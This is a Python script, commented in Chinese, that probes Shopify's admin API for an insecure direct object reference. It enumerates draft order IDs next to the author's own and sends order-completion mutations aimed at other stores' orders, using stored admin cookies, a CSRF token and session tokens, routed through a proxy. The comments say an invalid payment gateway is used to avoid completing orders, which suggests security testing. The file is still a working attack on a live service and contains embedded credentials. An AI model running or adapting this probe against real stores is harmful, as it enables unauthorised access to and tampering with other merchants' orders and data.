# -*- coding: utf-8 -*-
"""草稿订单 ID 越权探测:相邻 ID 属于其他店铺
如果响应返回 draftOrder 对象(而非 not found) -> 跨店铺资源可见/可操作 = IDOR
注意:paymentGatewayId 传无效值,确保不会真的完成别人的订单
"""
from curl_cffi import requests

COOKIE_FILE = r"C:\Users\tndc2\AppData\Local\Temp\admin_cookies.txt"
PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}

def load_cookies():
    raw = open(COOKIE_FILE, encoding="utf-8").read().strip()
    return {k: v for k, v in (p.split("=", 1) for p in raw.split("; ") if "=" in p)}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "X-CSRF-Token": "oTC8C29ZFZ-OPOn-MXOYPQ_NRv8AX-BB1tkHeg",
    "Origin": "https://admin.shopify.com",
    "Referer": "https://admin.shopify.com/store/jqpkdm-kb/draft_orders/1102015168554",
    "Sec-CH-UA": '"Chromium";v="138", "Google Chrome";v="138", "Not.A/Brand";v="99"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}

URL = "https://admin.shopify.com/api/operations/12af77c8135a10656e3cf14cb69d746505a1df3b62c08faea80a0a3949c21f8d/DraftOrderComplete/shopify/jqpkdm-kb"

def probe(draft_id):
    body = {
        "operationName": "DraftOrderComplete",
        "variables": {
            "id": f"gid://shopify/DraftOrder/{draft_id}",
            "paymentPending": True,
            "paymentGatewayId": "gid://shopify/PaymentGateway/99999999999999",  # 无效网关,防止真的完成
            "sourceName": "shopify_draft_orders",
            "bypassCartValidations": False,
        },
        "extensions": {"client_context": {"page_view_token": "81a384a6-1a26-4f04-93a2-faca565b1f40",
            "client_route_handle": "draftOrders:show",
            "client_pathname": f"/store/jqpkdm-kb/draft_orders/{draft_id}",
            "client_normalized_pathname": "/store/:storeHandle/draft_orders/:id",
            "shopify_session_token": "0f6832a6-1f3c-40ef-805e-29f861ec7367",
            "shopify_multitrack_token": "34b29e38-9809-47b2-ac03-64535d399fdd"}},
    }
    try:
        r = requests.post(URL, json=body, headers=HEADERS, cookies=load_cookies(), proxies=PROXY, impersonate="chrome", timeout=30)
        txt = r.text
        # 摘要:提取关键信息
        import re
        m = re.search(r'"draftOrder":\{"id":"([^"]+)"', txt)
        m2 = re.search(r'"message":"([^"]{0,120})', txt)
        order = m.group(1) if m else "null"
        msg = m2.group(1) if m2 else ""
        print(f"ID {draft_id}: HTTP {r.status_code} draftOrder={order} msg={msg}")
        return r
    except Exception as e:
        print(f"ID {draft_id}: ERROR {e}")
        return None

if __name__ == "__main__":
    base = 1102015168554
    ids = [base] + [base + d for d in [-1000, -100, -10, -5, -3, -2, -1, 1, 2, 3, 5, 10, 100, 1000]]
    print("基线=自己草稿订单:", base)
    for i in ids:
        probe(i)
